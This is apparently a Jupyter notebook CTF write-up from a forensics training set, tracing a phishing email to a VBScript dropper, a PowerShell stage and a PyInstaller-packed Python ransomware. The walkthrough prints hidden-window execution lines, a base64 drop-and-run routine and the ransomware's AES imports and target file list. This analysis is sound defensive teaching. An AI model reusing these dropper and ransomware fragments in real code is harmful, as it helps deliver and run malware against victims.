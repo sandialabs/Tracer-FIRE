{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# <span style=\"font-family:Papyrus; font-size:4em; color:Green;\">Herensuge</span>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## **Things to Remember:**\n",
    "\n",
    "1) Read the getting started before reading this write-up.\n",
    "\n",
    "2) All file paths shown are based on the computer used in this write-up.\n",
    "\n",
    "3) Use the Resource page/pdf to see a list all websites and programs used in this write-up."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 1</font>\n",
    "\n",
    "Ella's PC has been infected with ransomware. We think it happened after an email was sent to Amaya and then forwarded to Ella on August 23, 2018. Find the artifacts in the available smtp sessions. What is the email address of the sender?\n",
    "\n",
    "### Solution\n",
    "\n",
    "The question gives two critical pieces of information. First, the date of August 23, 2018. Second, that Amaya forwarded the malicious email to Ella. With that information, navigate to the SMTP files for Ella. All the smtp files are in Epoch time and will have to be converted.\n",
    "\n",
    "Let's convert the file times and display only files for August 23:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1535048736 --> 8/23/2018 6:25:36 PM\n",
      "1535049125 --> 8/23/2018 6:32:05 PM\n",
      "1535049575 --> 8/23/2018 6:39:35 PM\n",
      "1535052757 --> 8/23/2018 7:32:37 PM\n",
      "1535064592 --> 8/23/2018 10:49:52 PM\n"
     ]
    }
   ],
   "source": [
    "[string[]]$array = Get-ChildItem \"C:\\Users\\Administrator\\Artifacts\\smtp\\ebeltze\" -Name\n",
    "\n",
    "for($i=0; $i -le $array.GetUpperBound(0); $i++)\n",
    "{\n",
    "    $date = (Get-Date 01.01.1970)+([System.TimeSpan]::fromseconds($array[$i]))\n",
    "    #$date\n",
    "    if($date -like \"*08/23/2018*\")\n",
    "    {\n",
    "        write-host $array[$i] \"-->\" $date\n",
    "    }\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since this email was forwarded to Ella from Amaya, let's look for files that only include \"Fwd:\": "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "C:\\Users\\Administrator\\Artifacts\\smtp\\ebeltze\\1535052757:12:Subject: Fwd: Import Updates for your Hazia Equipment\n",
      "C:\\Users\\Administrator\\Artifacts\\smtp\\ebeltze\\1535064592:12:Subject: Fwd: UPDATED: Import Updates for your Hazia \n",
      "Equipment\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "Select-String -Path \"..\\smtp\\ebeltze\\15350*\" -Pattern 'Fwd:'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Two files include the \"Fwd:\" text, let's analyze these smtp files separately:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Return-Path: <alabank@orko.net>\n",
      "Delivered-To: ebeltze@orko.net\n",
      "Received: from _ (localhost [127.0.0.1])\n",
      "\tby mail.orko.net (Postfix) with ESMTPSA id D6250182093\n",
      "\tfor <ebeltze@orko.net>; Thu, 23 Aug 2018 12:32:36 -0700 (PDT)\n",
      "MIME-Version: 1.0\n",
      "Content-Type: multipart/mixed;\n",
      " boundary=\"=_a729b4cf3ca8fd9845339fcfa53284fa\"\n",
      "Date: Thu, 23 Aug 2018 12:32:36 -0700\n",
      "From: alabank@orko.net\n",
      "To: Ella Beltzetan <ebeltze@orko.net>\n",
      "Subject: Fwd: Import Updates for your Hazia Equipment\n",
      "Organization: Orko Electric\n",
      "In-Reply-To: <333be276c38f178aa7406ebe9f1cb801@hazia.com>\n",
      "References: <333be276c38f178aa7406ebe9f1cb801@hazia.com>\n",
      "Message-ID: <b8b70f6c12894433a81ea4c9ee78e886@orko.net>\n",
      "X-Sender: alabank@orko.net\n",
      "User-Agent: Roundcube Webmail\n",
      "\n",
      "--=_a729b4cf3ca8fd9845339fcfa53284fa\n",
      "Content-Transfer-Encoding: 7bit\n",
      "Content-Type: text/plain; charset=US-ASCII;\n",
      " format=flowed\n",
      "\n",
      "Ella,\n",
      "\n",
      "I think I have wrapped things up.\n",
      "\n",
      "I let Atton know he's in charge while I'm out.\n",
      "\n",
      "In the mean I need you to run these updates for the Hazia equipment.\n",
      "Hektor said they were critical to avoid system interruptions or \n",
      "compromises.\n",
      "\n",
      "Thanks,\n",
      "\n",
      "Amaya\n",
      "\n",
      "-------- Original Message --------\n",
      "Subject: Import Updates for your Hazia Equipment\n",
      "Date: 2018-08-23 11:20\n",
      " From: helizondo@hazia.com\n",
      "To: alabank@orko.net\n",
      "\n",
      "Hi Amaya,\n",
      "\n",
      "Here are some very important updates for your Hazia ICS equipment. I \n",
      "wanted to get this to you personally right away. Make sure you run these \n",
      "urgent updates tonight to avoid any inconvenient interruptions or \n",
      "attacks on your systems.\n",
      "\n",
      "Ciao!\n",
      "\n",
      "H\n",
      "\n",
      "BTW - Hazia will be hosting a Basque festival in honor of Orko \n",
      "Electric's Basque roots. We would love if you could make it tomorrow \n",
      "night as our keynote speaker. It will be held at the Grand Pavilion on \n",
      "6th at 8PM.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "Get-Content \"..\\smtp\\ebeltze\\1535052757\" -First 60"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Return-Path: <alabank@orko.net>\n",
      "Delivered-To: ebeltze@orko.net\n",
      "Received: from _ (localhost [127.0.0.1])\n",
      "\tby mail.orko.net (Postfix) with ESMTPSA id 39AD7182068\n",
      "\tfor <ebeltze@orko.net>; Thu, 23 Aug 2018 15:49:48 -0700 (PDT)\n",
      "MIME-Version: 1.0\n",
      "Content-Type: multipart/mixed;\n",
      " boundary=\"=_a53a75e3bb55af5a50dea77d87e2bef9\"\n",
      "Date: Thu, 23 Aug 2018 15:49:48 -0700\n",
      "From: alabank@orko.net\n",
      "To: Ella Beltzetan <ebeltze@orko.net>\n",
      "Subject: Fwd: UPDATED: Import Updates for your Hazia Equipment\n",
      "Organization: Orko Electric\n",
      "In-Reply-To: <f8f30025a11a8c40786d138dce011c7b@hazia.com>\n",
      "References: <f8f30025a11a8c40786d138dce011c7b@hazia.com>\n",
      "Message-ID: <a0c1b7bd7af4eb0899acca52fbe01231@orko.net>\n",
      "X-Sender: alabank@orko.net\n",
      "User-Agent: Roundcube Webmail\n",
      "\n",
      "--=_a53a75e3bb55af5a50dea77d87e2bef9\n",
      "Content-Transfer-Encoding: 7bit\n",
      "Content-Type: text/plain; charset=US-ASCII;\n",
      " format=flowed\n",
      "\n",
      "Ugh...apparently Hektor sent a broken update. Here's the new one for our \n",
      "Hazia equipment.\n",
      "\n",
      "So much for taking a moment for myself.\n",
      "\n",
      "Can you install these updates please?\n",
      "\n",
      "Amaya\n",
      "\n",
      "-------- Original Message --------\n",
      "Subject: UPDATED: Import Updates for your Hazia Equipment\n",
      "Date: 2018-08-23 15:20\n",
      " From: helizondo@hazia.com\n",
      "To: alabank@orko.net\n",
      "\n",
      "Please see attached updated script to update your Hazia equipment. \n",
      "Disregard our previous email as the update software was broken.\n",
      "\n",
      "H\n",
      "\n",
      "-- \n",
      "Amaya Labankada\n",
      "CIO, Orko Electric\n",
      "alabank@orko.net\n",
      "--=_a53a75e3bb55af5a50dea77d87e2bef9\n",
      "Content-Transfer-Encoding: base64\n",
      "Content-Type: text/plain; charset=us-ascii;\n",
      " name=caller.vbs\n",
      "Content-Disposition: attachment;\n",
      " filename=caller.vbs;\n",
      " size=6553346\n",
      "\n",
      "ZGltIGV4ZWN1dGFibGUNCmRpbSBvdXRGaWxlDQoNCicgc3RhcnQgcG93ZXJzaGVsbA0KZXhlY3V0\n",
      "YWJsZT0iSXlCemRHRnlkQ0JsZUdWamRYUmhZbXhsRFFva1lqWTBJRDBnSjFSV2NWRkJRVTFCUVVG\n",
      "QlJVRkJRVUV2THpoQlFVeG5RVUZCUVVGQlFVRkJVVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZC\n",
      "UVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCWjBGQlFVRkJOR1oxWnpSQmRFRnVU\n"
     ]
    }
   ],
   "source": [
    "Get-Content \"..\\smtp\\ebeltze\\1535064592\" -First 60"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Both emails are from the same sender (helizondo@hazia.com) stating that a software update needs to be installed.\n",
    "\n",
    "#### Answer: helizondo@hazia.com"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 2</font>\n",
    "\n",
    "What is the name of the script that infected Ella's PC with ransomware (include the extension in the script name)?\n",
    "\n",
    "### Solution\n",
    "\n",
    "Start from the two smtp files from Herensuge 1:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Return-Path: <alabank@orko.net>\n",
      "Delivered-To: ebeltze@orko.net\n",
      "Received: from _ (localhost [127.0.0.1])\n",
      "\tby mail.orko.net (Postfix) with ESMTPSA id D6250182093\n",
      "\tfor <ebeltze@orko.net>; Thu, 23 Aug 2018 12:32:36 -0700 (PDT)\n",
      "MIME-Version: 1.0\n",
      "Content-Type: multipart/mixed;\n",
      " boundary=\"=_a729b4cf3ca8fd9845339fcfa53284fa\"\n",
      "Date: Thu, 23 Aug 2018 12:32:36 -0700\n",
      "From: alabank@orko.net\n",
      "To: Ella Beltzetan <ebeltze@orko.net>\n",
      "Subject: Fwd: Import Updates for your Hazia Equipment\n",
      "Organization: Orko Electric\n",
      "In-Reply-To: <333be276c38f178aa7406ebe9f1cb801@hazia.com>\n",
      "References: <333be276c38f178aa7406ebe9f1cb801@hazia.com>\n",
      "Message-ID: <b8b70f6c12894433a81ea4c9ee78e886@orko.net>\n",
      "X-Sender: alabank@orko.net\n",
      "User-Agent: Roundcube Webmail\n",
      "\n",
      "--=_a729b4cf3ca8fd9845339fcfa53284fa\n",
      "Content-Transfer-Encoding: 7bit\n",
      "Content-Type: text/plain; charset=US-ASCII;\n",
      " format=flowed\n",
      "\n",
      "Ella,\n",
      "\n",
      "I think I have wrapped things up.\n",
      "\n",
      "I let Atton know he's in charge while I'm out.\n",
      "\n",
      "In the mean I need you to run these updates for the Hazia equipment.\n",
      "Hektor said they were critical to avoid system interruptions or \n",
      "compromises.\n",
      "\n",
      "Thanks,\n",
      "\n",
      "Amaya\n",
      "\n",
      "-------- Original Message --------\n",
      "Subject: Import Updates for your Hazia Equipment\n",
      "Date: 2018-08-23 11:20\n",
      " From: helizondo@hazia.com\n",
      "To: alabank@orko.net\n",
      "\n",
      "Hi Amaya,\n",
      "\n",
      "Here are some very important updates for your Hazia ICS equipment. I \n",
      "wanted to get this to you personally right away. Make sure you run these \n",
      "urgent updates tonight to avoid any inconvenient interruptions or \n",
      "attacks on your systems.\n",
      "\n",
      "Ciao!\n",
      "\n",
      "H\n",
      "\n",
      "BTW - Hazia will be hosting a Basque festival in honor of Orko \n",
      "Electric's Basque roots. We would love if you could make it tomorrow \n",
      "night as our keynote speaker. It will be held at the Grand Pavilion on \n",
      "6th at 8PM.\n",
      "\n",
      "-- \n",
      "Amaya Labankada\n",
      "CIO, Orko Electric\n",
      "alabank@orko.net\n",
      "--=_a729b4cf3ca8fd9845339fcfa53284fa\n",
      "Content-Transfer-Encoding: base64\n",
      "Content-Type: text/plain; charset=us-ascii;\n",
      " name=caller.vbs\n",
      "Content-Disposition: attachment;\n",
      " filename=caller.vbs;\n"
     ]
    }
   ],
   "source": [
    "Get-Content \"..\\smtp\\ebeltze\\1535052757\" -First 70"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Return-Path: <alabank@orko.net>\n",
      "Delivered-To: ebeltze@orko.net\n",
      "Received: from _ (localhost [127.0.0.1])\n",
      "\tby mail.orko.net (Postfix) with ESMTPSA id 39AD7182068\n",
      "\tfor <ebeltze@orko.net>; Thu, 23 Aug 2018 15:49:48 -0700 (PDT)\n",
      "MIME-Version: 1.0\n",
      "Content-Type: multipart/mixed;\n",
      " boundary=\"=_a53a75e3bb55af5a50dea77d87e2bef9\"\n",
      "Date: Thu, 23 Aug 2018 15:49:48 -0700\n",
      "From: alabank@orko.net\n",
      "To: Ella Beltzetan <ebeltze@orko.net>\n",
      "Subject: Fwd: UPDATED: Import Updates for your Hazia Equipment\n",
      "Organization: Orko Electric\n",
      "In-Reply-To: <f8f30025a11a8c40786d138dce011c7b@hazia.com>\n",
      "References: <f8f30025a11a8c40786d138dce011c7b@hazia.com>\n",
      "Message-ID: <a0c1b7bd7af4eb0899acca52fbe01231@orko.net>\n",
      "X-Sender: alabank@orko.net\n",
      "User-Agent: Roundcube Webmail\n",
      "\n",
      "--=_a53a75e3bb55af5a50dea77d87e2bef9\n",
      "Content-Transfer-Encoding: 7bit\n",
      "Content-Type: text/plain; charset=US-ASCII;\n",
      " format=flowed\n",
      "\n",
      "Ugh...apparently Hektor sent a broken update. Here's the new one for our \n",
      "Hazia equipment.\n",
      "\n",
      "So much for taking a moment for myself.\n",
      "\n",
      "Can you install these updates please?\n",
      "\n",
      "Amaya\n",
      "\n",
      "-------- Original Message --------\n",
      "Subject: UPDATED: Import Updates for your Hazia Equipment\n",
      "Date: 2018-08-23 15:20\n",
      " From: helizondo@hazia.com\n",
      "To: alabank@orko.net\n",
      "\n",
      "Please see attached updated script to update your Hazia equipment. \n",
      "Disregard our previous email as the update software was broken.\n",
      "\n",
      "H\n",
      "\n",
      "-- \n",
      "Amaya Labankada\n",
      "CIO, Orko Electric\n",
      "alabank@orko.net\n",
      "--=_a53a75e3bb55af5a50dea77d87e2bef9\n",
      "Content-Transfer-Encoding: base64\n",
      "Content-Type: text/plain; charset=us-ascii;\n",
      " name=caller.vbs\n",
      "Content-Disposition: attachment;\n",
      " filename=caller.vbs;\n",
      " size=6553346\n",
      "\n",
      "ZGltIGV4ZWN1dGFibGUNCmRpbSBvdXRGaWxlDQoNCicgc3RhcnQgcG93ZXJzaGVsbA0KZXhlY3V0\n",
      "YWJsZT0iSXlCemRHRnlkQ0JsZUdWamRYUmhZbXhsRFFva1lqWTBJRDBnSjFSV2NWRkJRVTFCUVVG\n",
      "QlJVRkJRVUV2THpoQlFVeG5RVUZCUVVGQlFVRkJVVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZC\n",
      "UVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCWjBGQlFVRkJOR1oxWnpSQmRFRnVU\n"
     ]
    }
   ],
   "source": [
    "Get-Content \"..\\smtp\\ebeltze\\1535064592\" -First 60"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Both files include an attachment named `called.vbs`. \n",
    "\n",
    "#### Answer:  caller.vbs"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 3</font>\n",
    "\n",
    "Extract out the VBScript from the email SMTP session. What file did the VBScript create and execute?\n",
    "\n",
    "### Solution\n",
    "\n",
    "Looking back at the two smtp files from Herensuge 2, the second email \"1535064592\" with the corrected update script seems off. The email has no greeting, broken grammar, and no formal ending. When compared to the first email \"1535052757\" it seems almost like a different person. Knowing that Ella probably installed the VBScript from the second email, that's the first place to start.\n",
    "\n",
    "Extract the \"caller.vbs\" file from Ella's \"1535064592\" smtp file. This can be down by base64 decoding the attachment manually from the email or with the following `carve.py` python script which with the following commands below:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Email part ID 0: None\n",
      "==> Content Type: multipart/mixed\n",
      "\n",
      "[+] Email part ID 1: None\n",
      "==> Content Length in bytes: 535\n",
      "==> Content Type: text/plain\n",
      "\n",
      "[+] Email part ID 2: caller.vbs\n",
      "==> Content Length in bytes: 6553346\n",
      "==> Content Type: text/plain\n",
      "\n"
     ]
    }
   ],
   "source": [
    "python ../carve.py \"..\\smtp\\ebeltze\\1535064592\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The VBScript file in question has the ID 2 which was passed in the command below to extract it:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Email part ID 0: None\n",
      "==> Content Type: multipart/mixed\n",
      "\n",
      "[+] Email part ID 1: None\n",
      "==> Content Length in bytes: 535\n",
      "==> Content Type: text/plain\n",
      "\n",
      "[+] Email part ID 2: caller.vbs\n",
      "==> Content Length in bytes: 6553346\n",
      "==> Content Type: text/plain\n",
      "\n",
      "Dumping email part ID 2 with filename caller.vbs...\n",
      "Successfully dumped file caller.vbs\n"
     ]
    }
   ],
   "source": [
    "python ../carve.py \"..\\smtp\\ebeltze\\1535064592\" 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since the file is larger, open it in sublime and scroll to the bottom. We can look at the bottom of the code with the following command:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Get-Content \"C:\\Users\\Administrator\\Artifacts\\caller.vbs\" -Last 9"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![Heren](pics/Heren7.png)\n",
    "\n",
    "The VBScript creates a file called `aisoudfwemidf.ps1` and executes it.\n",
    "\n",
    "#### Answer: aisoudfwemidf.ps1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 4</font>\n",
    "\n",
    "What file did the Powershell script create and execute?\n",
    "\n",
    "### Solution\n",
    "\n",
    "We need to delete the code in the `caller.vbs` script that executes and deletes the Powershell program:\n",
    "\n",
    "![Heren](pics/Heren4-1.png)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": []
    }
   ],
   "source": [
    "$original_file = '..\\caller.vbs'\n",
    "$destination_file = \"..\\caller_clean.vbs\"\n",
    "(Get-Content $original_file) | Foreach-Object {\n",
    "    $_.replace('SET oShell = WScript.CreateObject(\"Wscript.Shell\")', '').replace('currentCommand = \"powershell.exe -WindowStyle Hidden .\\aisoudfwemidf.ps1\"', '').replace('oShell.run currentCommand,1,True', '').replace('objFSO.DeleteFile \"aisoudfwemidf.ps1\"', '')\n",
    "    } | Set-Content $destination_file "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now execute the `caller_clean.vbs` script and a Powershell file will be created."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since the file is larger, open `aisoudfwemidf.ps1` in sublime and scroll to the bottom. We can look at the bottom of the code with the following command:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "# end executable\n",
      "$filename = 'aisoudfwemidf.exe'\n",
      "\n",
      "$bytes = [Convert]::FromBase64String($b64)\n",
      "[IO.File]::WriteAllBytes($filename, $bytes)\n",
      "Start-Process -FilePath $filename -Wait\n",
      "Remove-Item $filename\n"
     ]
    }
   ],
   "source": [
    "Get-Content \"..\\aisoudfwemidf.ps1\" -Last 7"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![Heren](pics/Heren4-2.png)\n",
    "\n",
    "The Powershell script creates and executes a file called `aisoudfwemidf.exe`.\n",
    "\n",
    "#### Answer:  aisoudfwemidf.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 5</font>\n",
    "\n",
    "Time to do some reverse engineering! At first glance, the final executable is packed. (https://en.wikipedia.org/wiki/Executable_compression). What popular packer does this executable use?\n",
    "\n",
    "### Solution\n",
    "\n",
    "We need to delete the code in the `aisoudfwemidf.ps1` script that executes and deletes the `aisoudfwemidf.exe`file: "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "$filename = 'aisoudfwemidf.exe'\n",
      "\n",
      "$bytes = [Convert]::FromBase64String($b64)\n",
      "[IO.File]::WriteAllBytes($filename, $bytes)\n",
      "Start-Process -FilePath $filename -Wait\n",
      "Remove-Item $filename\n"
     ]
    }
   ],
   "source": [
    "Get-Content \"..\\aisoudfwemidf.ps1\" -Last 6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![Heren](pics/Heren5-1.png)\n",
    "\n",
    "Now execute the `aisoudfwemidf.exe` script and an EXE file will be created. This can be done with the following command:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Invoke-Item \"..\\aisoudfwemidf.ps1\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Open the application **PEiD** and open the **aisoudfwemidf.exe** file in it. You'll notice that the EP Section listes UPX. UPX is a popular packer.\n",
    "\n",
    "![Heren](pics/Heren5-2.png)\n",
    "\n",
    "#### Answer: UPX"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 6</font>\n",
    "\n",
    "Unpack the executable. What programming language was the original executable written in?\n",
    "\n",
    "### Solution\n",
    "\n",
    "Knowing that the executable was packed with UPX, we can use UPX to decompress the executable with this command: "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "                       Ultimate Packer for eXecutables\n",
      "                          Copyright (C) 1996 - 2018\n",
      "UPX 3.95w       Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018\n",
      "\n",
      "        File size         Ratio      Format      Name\n",
      "   --------------------   ------   -----------   -----------\n",
      "   3716929 <-   3685185   99.15%    win32/pe     aisoudfwemidf.exe\n",
      "\n",
      "Unpacked 1 file.\n"
     ]
    }
   ],
   "source": [
    "C:\\Tools\\upx-3.95-win64\\upx.exe -d \"..\\aisoudfwemidf.exe\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Open the decompressed file in IDA.\n",
    "\n",
    "Locate the strings panel. While scrolling through his panel, you'll notice that python is called on many times. Specifically a python dll. \n",
    "\n",
    "![Heren](pics/Heren6-1.png)\n",
    "\n",
    "#### Answer: Python"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 7</font>\n",
    "\n",
    "What is the prefix preceding the random number in the name of the temporary directory created by the ransomware?\n",
    "\n",
    "### Solution\n",
    "\n",
    "Continue examining the decompressed `aisoudfwemidf.exe` file in IDA. \n",
    "\n",
    "The question states that a temporary directory was created by the ransomware. In the function windows, you'll want to look for a new directory being created or mkdir:\n",
    "\n",
    "![Heren](pics/Heren7-1.png)\n",
    "\n",
    "Double clicking the function will take you to the IDA View-A where you can select \"\\_mkdir\" and press x to list the cross references (where that function was called from). \n",
    "\n",
    "![Heren](pics/Heren7-2.png)\n",
    "\n",
    "From there you'll notice that the \"\\_mkdir\" is using a \"\\_MEI%d\" to pre-pend the file path.\n",
    "\n",
    "![Heren](pics/Heren7-3.png)\n",
    "\n",
    "#### Answer: _MEI"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 8</font>\n",
    "\n",
    "Your answers to the last two question should give you more hints as to how the ransomware was packed. What tool/library was used in packing the ransomware?\n",
    "\n",
    "### Solution\n",
    "\n",
    "Look up the last two answers **_ MEI and Python (nospace between the underscore and MEI)** and the results give the tool/library.\n",
    "\n",
    "![Heren](pics/Heren27.png)\n",
    "\n",
    "\n",
    "#### Answer: PyInstaller"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 9</font>\n",
    "\n",
    "Extract the original Python script(s). How is the wallpaper image encoded?\n",
    "\n",
    "### Solution\n",
    "\n",
    "We need to extract the python scripts from the executable file. In the tools folder, a program named `pyinstxtractor.py`is built just for that. Use the following command to unpack the executable:\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "C:\\Tools\\pyinstxtractor.py:35: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses\n",
      "  import imp\n",
      "[*] Processing ..\\aisoudfwemidf.exe\n",
      "[*] Pyinstaller version: 2.1+\n",
      "[*] Python version: 27\n",
      "[*] Length of package: 3589441 bytes\n",
      "[*] Found 21 files in CArchive\n",
      "[*] Begining extraction...please standby\n",
      "[!] Warning: The script is running in a different python version than the one used to build the executable\n",
      "    Run this script in Python27 to prevent extraction errors(if any) during unmarshalling\n",
      "[*] Found 204 files in PYZ archive\n",
      "[*] Successfully extracted pyinstaller archive: ..\\aisoudfwemidf.exe\n",
      "\n",
      "You can now use a python decompiler on the pyc files within the extracted directory\n"
     ]
    }
   ],
   "source": [
    "python C:\\Tools\\pyinstxtractor.py ..\\aisoudfwemidf.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's look at the files that were extracted:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\n",
      "    Directory: C:\\Users\\Administrator\\Artifacts\\aisoudfwemidf.exe_extracted\n",
      "\n",
      "\n",
      "Mode                LastWriteTime         Length Name                       \n",
      "----                -------------         ------ ----                       \n",
      "d-----        10/7/2019   8:32 AM                out00-PYZ.pyz_extracted    \n",
      "-a----        10/7/2019   8:32 AM          35840 bz2.pyd                    \n",
      "-a----        10/7/2019   8:32 AM          16384 Crypto.Cipher._AES.pyd     \n",
      "-a----        10/7/2019   8:32 AM           8704 Crypto.Util._counter.pyd   \n",
      "-a----        10/7/2019   8:32 AM           1050 microsoft.vc90.crt.manifest\n",
      "-a----        10/7/2019   8:32 AM         225280 msvcm90.dll                \n",
      "-a----        10/7/2019   8:32 AM         336016 msvcp90.dll                \n",
      "-a----        10/7/2019   8:32 AM         251024 msvcr90.dll                \n",
      "-a----        10/7/2019   8:32 AM         663244 out00-PYZ.pyz              \n",
      "-a----        10/7/2019   8:32 AM              0 pyi-windows-manifest-filena\n",
      "                                                 me ransomware.exe.manifest \n",
      "-a----        10/7/2019   8:32 AM           6604 pyiboot01_bootstrap        \n",
      "-a----        10/7/2019   8:32 AM           2480 pyimod01_os_path           \n",
      "-a----        10/7/2019   8:32 AM          10322 pyimod02_archive           \n",
      "-a----        10/7/2019   8:32 AM          16936 pyimod03_importers         \n",
      "-a----        10/7/2019   8:32 AM         898048 python27.dll               \n",
      "-a----        10/7/2019   8:32 AM        1328300 ransomware                 \n",
      "-a----        10/7/2019   8:32 AM           1347 ransomware.exe.manifest    \n",
      "-a----        10/7/2019   8:32 AM           9216 select.pyd                 \n",
      "-a----        10/7/2019   8:32 AM            234 struct                     \n",
      "-a----        10/7/2019   8:32 AM         181760 unicodedata.pyd            \n",
      "-a----        10/7/2019   8:32 AM          37888 _ctypes.pyd                \n",
      "-a----        10/7/2019   8:32 AM         351744 _hashlib.pyd               \n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "Get-ChildItem -Path ..\\aisoudfwemidf.exe_extracted"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "According to the the `pyinstxtractor.py` documentation, the main python file that contains the logic will usually be the file without any extension. In our case, that file is `ransomware`. Let's open the first 30 lines of this file with the following command:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "from Crypto.Cipher import AES\n",
      "from Crypto.Util import Counter\n",
      "import os\n",
      "import ctypes\n",
      "import time\n",
      "import random\n",
      "import base64\n",
      "import _winreg as winreg\n",
      "\n",
      "\n",
      "extensions = [\n",
      "        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!\n",
      "        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images\n",
      "        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound\n",
      "        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies\n",
      "\n",
      "        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office\n",
      "        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc\n",
      "        'yml', 'yaml', 'json', 'xml', 'csv', # structured data\n",
      "        'db', 'sql', 'dbf', 'mdb', # databases and disc images\n",
      "\n",
      "        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies\n",
